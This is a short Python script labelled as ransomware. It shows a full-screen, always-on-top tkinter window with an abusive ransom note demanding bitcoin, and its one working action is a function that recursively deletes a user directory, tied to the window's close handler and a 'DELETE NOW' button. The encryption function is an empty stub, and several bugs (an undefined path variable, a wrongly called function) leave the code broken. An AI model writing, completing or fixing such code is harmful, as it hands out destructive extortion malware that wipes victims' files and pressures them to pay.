
#ransomware 
textmal = "                           !!! You Are An Idiot !!!\n\nHello little stupid, you have executed one of the best RANSOMWARE in the world,\n your personal files have been encrypted with a strong algorithm created by us.\nThe only method to get back your data is to pay in bitcoin to the address shown\ndown here. The rules are:\n \n - DO NOT CLOSE ME \n - DO NOT TRY TO RESTART \n - DO NOT TRY TO SHUT DOWN \n  \nEverything you want to do, like decrypt your data and else is forbidden. If you dont pay in 24 hours all is gonna be deleted. Good luck stupid. "
import tkinter as tk
from tkinter import messagebox
import os
from time import sleep
import shutil as st


def crypt():
    pass 

def delete_all():

    try:
        st.rmtree(path)
        print(f"{path} successfully wiped.")
    except FileNotFoundError:
        print(f"{path} does not exist.")
    except PermissionError:
        print(f"Permission denied for {path}.")
    except Exception as e:
        print(f"An error occurred: {e}")

    if __name__ == "__main__":
        path = "/user/carlo"
        delete_all(path)
def use():
    root = tk.Tk()

    
    def on_closing():
        if messagebox.askokcancel("Quit", "Do you want to destroy your pc?"):
            delete_all()
            root.destroy()
            use()
        else:
            use()

    root.protocol("WM_DELETE_WINDOW", on_closing)

        
    root.title("You're Fucked")
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    root.geometry(f"{screen_width}x{screen_height}+0+0")  
    root.attributes("-fullscreen", True)  

    root.resizable(False, False)
    root.wm_attributes('-topmost', True)

    text_widget = tk.Text(root)
    text_widget.pack(pady=10)
    text_widget.insert(tk.END, textmal , "custom_color")
    text_widget.tag_configure("custom_color", foreground="white")
    deletenowbutton = tk.Button(root, text="DELETE  NOW", command=delete_all())
    deletenowbutton.config(bg="white")
    deletenowbutton.pack(pady=10)
    root.config(bg="#831212")
    text_widget.config(bg="#831212")
    text_widget.config(state='disabled') 

    root.mainloop()
    
    

def confirm():
    result = messagebox.askquestion("", "Are you sure you want to continue?")
    if result == "yes":
        use()

    else:
        pass

confirm()
